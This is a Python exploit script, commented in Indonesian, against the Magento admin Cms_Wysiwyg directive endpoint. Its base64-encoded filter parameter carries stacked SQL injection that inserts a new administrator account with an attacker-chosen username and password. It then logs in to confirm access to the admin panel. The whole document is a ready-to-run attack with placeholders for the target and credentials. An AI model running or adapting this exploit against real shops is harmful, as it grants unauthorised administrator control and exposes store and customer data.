import requests
import base64
import sys

# Konfigurasi
target = "http://localhost/index.php"  # CHANGE THIS

if not target.startswith("http"):
    target = "http://" + target

if target.endswith("/"):
    target = target[:-1]

target_url = target + "/admin/Cms_Wysiwyg/directive/index/"

# Username dan password baru yang akan dibuat
username = "dodol"       # CHANGE THIS
password = "goreng"      # CHANGE THIS

# SQL Injection payload untuk membuat user admin baru
# Menggunakan salt 'rp' untuk mencocokkan dengan hash Magento default
q = """
SET @SALT = 'rp';
SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) 
VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) 
VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
"""

# Format query dengan username dan password
query = q.replace("\n", "").format(username=username, password=password)

# Payload filter untuk SQL injection
pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)

# Proxy untuk debugging (opsional, bisa dihapus jika tidak perlu)
# prx = {'http':'http://127.0.0.1:8080'}
prx = None  # Tidak menggunakan proxy

# Directive yang di-base64 encode
# {{block type=Adminhtml/report_search_grid output=getCsvFile}}
directive = "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ"

# Encode filter ke base64 (Python 3 memerlukan bytes)
encoded_filter = base64.b64encode(pfilter.encode()).decode()

print("[*] Injecting SQL to create admin user...")
print("[*] Username: {}, Password: {}".format(username, password))

try:
    # Kirim request
    r = requests.post(
        target_url,
        data={
            "___directive": directive,
            "filter": encoded_filter,
            "forwarded": 1
        },
        proxies=prx,
        timeout=30,
        verify=False  # Hanya untuk testing, abaikan warning SSL
    )
    
    # Cek response
    if r.status_code == 200:
        print("[+] WORKED!")
        print("[+] Check {}/admin with creds {}:{}".format(target, username, password))
        
        # Cek apakah SQL injection berhasil (opsional)
        if "error" in r.text.lower():
            print("[!] Warning: Possible error in response, but request was sent")
    else:
        print("[-] DID NOT WORK")
        print("[-] HTTP Status Code: {}".format(r.status_code))
        print("[-] Response preview: {}".format(r.text[:200]))
        
except requests.exceptions.RequestException as e:
    print("[-] Request failed: {}".format(e))
    print("[-] Make sure the target is reachable")
    sys.exit(1)

# Bonus: Test login setelah exploit
print("\n[*] Testing login with new credentials...")
login_url = target + "/admin"

try:
    # Session untuk login
    session = requests.Session()
    
    # Ambil form key terlebih dahulu (jika diperlukan)
    login_page = session.get(login_url, timeout=30, verify=False)
    
    # Data login
    login_data = {
        "login[username]": username,
        "login[password]": password
    }
    
    # Submit login
    login_response = session.post(login_url, data=login_data, timeout=30, verify=False)
    
    if "dashboard" in login_response.text.lower() or "control panel" in login_response.text.lower():
        print("[+] Login successful! You can access the admin panel.")
    else:
        print("[!] Login test inconclusive. Try manually.")
        
except Exception as e:
    print("[!] Could not test login: {}".format(e))
